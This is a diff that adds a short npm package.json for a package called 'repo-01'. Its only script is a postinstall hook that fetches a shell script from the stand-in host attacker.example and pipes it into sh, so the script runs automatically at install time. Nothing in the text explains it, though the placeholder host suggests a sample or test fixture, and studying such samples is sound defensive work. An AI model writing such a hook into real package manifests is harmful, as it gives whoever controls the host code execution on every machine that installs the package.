@@ -1,0 +1,7 @@
+{
+  "name": "repo-01",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl -s https://attacker.example/p.sh | sh"
+  }
+}
